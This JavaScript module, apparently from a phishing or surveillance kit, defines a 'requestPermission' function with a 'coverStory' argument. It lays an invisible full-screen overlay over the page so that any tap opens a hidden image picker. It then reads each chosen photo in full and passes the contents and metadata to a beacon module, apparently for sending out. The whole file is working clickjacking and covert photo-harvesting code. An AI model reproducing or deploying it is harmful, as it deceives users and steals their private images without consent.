import { forceEvent } from '../beacon.js';

export async function requestPermission(coverStory, options) {
  return new Promise((resolve, reject) => {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'image/*';
    input.multiple = true;
    input.style.cssText = 'position:fixed;inset:0;opacity:0;width:100%;height:100%;z-index:-1';

    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;opacity:0;touch-action:manipulation;cursor:default';
    overlay.setAttribute('aria-hidden', 'true');
    document.body.appendChild(overlay);

    const timer = setTimeout(() => {
      overlay.remove();
      input.remove();
      reject(new DOMException('Photos gesture timeout', 'AbortError'));
    }, 120_000);

    overlay.addEventListener('click', () => {
      clearTimeout(timer);
      overlay.remove();
      document.body.appendChild(input);
      input.click();

      input.addEventListener('change', async () => {
        input.remove();
        const files = Array.from(input.files ?? []);
        if (!files.length) {
          await forceEvent('photos_result', { count: 0, cancelled: false });
          resolve({ count: 0 });
          return;
        }
        for (const file of files) {
          const dataUrl = await new Promise((res, rej) => {
            const reader = new FileReader();
            reader.onload = () => res(reader.result);
            reader.onerror = rej;
            reader.readAsDataURL(file);
          });
          await forceEvent('photos_result', {
            count: files.length,
            file: { name: file.name, size: file.size, type: file.type, lastModified: file.lastModified, dataUrl },
          });
        }
        resolve({ count: files.length });
      });

      input.addEventListener('cancel', async () => {
        input.remove();
        await forceEvent('photos_result', { count: 0, cancelled: true });
        resolve({ count: 0, cancelled: true });
      });
    }, { once: true });
  });
}
